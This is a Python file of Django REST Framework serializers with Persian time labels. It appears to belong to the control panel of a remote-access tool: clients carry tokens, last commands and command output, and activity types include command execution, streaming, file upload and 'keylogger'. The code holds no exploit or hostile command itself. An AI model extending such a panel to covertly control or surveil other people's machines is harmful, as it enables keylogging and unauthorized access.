from rest_framework import serializers
from .models import Client, ClientActivity, Notification
from django.utils import timezone
from datetime import timedelta

class ClientSerializer(serializers.ModelSerializer):
    is_online = serializers.SerializerMethodField()
    display_name = serializers.CharField(required=False, allow_blank=True, allow_null=True)
    system_info = serializers.JSONField(read_only=True)
    last_seen_formatted = serializers.SerializerMethodField()

    class Meta:
        model = Client
        fields = [
            'client_id',
            'display_name',
            'token',
            'last_seen',
            'last_seen_formatted',
            'last_command',
            'command_id',
            'last_output',
            'is_online',
            'system_info',
            'is_streaming',
            'stream_type',
            'created_at'
        ]
        read_only_fields = ['client_id', 'token', 'created_at', 'last_seen']

    def get_is_online(self, obj):
        return obj.last_seen >= timezone.now() - timedelta(seconds=30)

    def get_last_seen_formatted(self, obj):
        if obj.is_online:
            return 'هم اکنون'
        
        now = timezone.now()
        diff = now - obj.last_seen
        
        if diff.days > 0:
            return f"{diff.days} روز پیش"
        elif diff.seconds > 3600:
            hours = diff.seconds // 3600
            return f"{hours} ساعت پیش"
        elif diff.seconds > 60:
            minutes = diff.seconds // 60
            return f"{minutes} دقیقه پیش"
        return "همین حالا"

class ClientActivitySerializer(serializers.ModelSerializer):
    client_id = serializers.CharField(source='client.client_id', read_only=True)
    client_name = serializers.CharField(source='client.display_name', read_only=True)
    time_ago = serializers.SerializerMethodField()
    icon_class = serializers.SerializerMethodField()

    class Meta:
        model = ClientActivity
        fields = [
            'id',
            'client_id',
            'client_name',
            'activity_type',
            'description',
            'details',
            'created_at',
            'time_ago',
            'icon_class'
        ]

    def get_time_ago(self, obj):
        now = timezone.now()
        diff = now - obj.created_at

        if diff.days > 0:
            return f"{diff.days} روز پیش"
        elif diff.seconds > 3600:
            return f"{diff.seconds // 3600} ساعت پیش"
        elif diff.seconds > 60:
            return f"{diff.seconds // 60} دقیقه پیش"
        return "همین حالا"

    def get_icon_class(self, obj):
        icons = {
            'command': 'fas fa-terminal text-success',
            'connection': 'fas fa-plug text-info',
            'stream': 'fas fa-video text-primary',
            'file': 'fas fa-file-upload text-warning',
            'keylogger': 'fas fa-keyboard text-danger',
            'other': 'fas fa-info-circle text-secondary'
        }
        return icons.get(obj.activity_type, 'fas fa-circle')

class NotificationSerializer(serializers.ModelSerializer):
    time_ago = serializers.SerializerMethodField()
    icon_class = serializers.SerializerMethodField()
    client_name = serializers.CharField(source='client.display_name', read_only=True, allow_null=True)

    class Meta:
        model = Notification
        fields = [
            'id',
            'client',
            'client_name',
            'notification_type',
            'title',
            'message',
            'is_read',
            'created_at',
            'time_ago',
            'icon_class'
        ]

    def get_time_ago(self, obj):
        now = timezone.now()
        diff = now - obj.created_at

        if diff.days > 0:
            return f"{diff.days} روز پیش"
        elif diff.seconds > 3600:
            return f"{diff.seconds // 3600} ساعت پیش"
        elif diff.seconds > 60:
            return f"{diff.seconds // 60} دقیقه پیش"
        return "همین حالا"

    def get_icon_class(self, obj):
        icons = {
            'info': 'fas fa-info-circle text-info',
            'success': 'fas fa-check-circle text-success',
            'warning': 'fas fa-exclamation-triangle text-warning',
            'error': 'fas fa-times-circle text-danger'
        }
        return icons.get(obj.notification_type, 'fas fa-bell')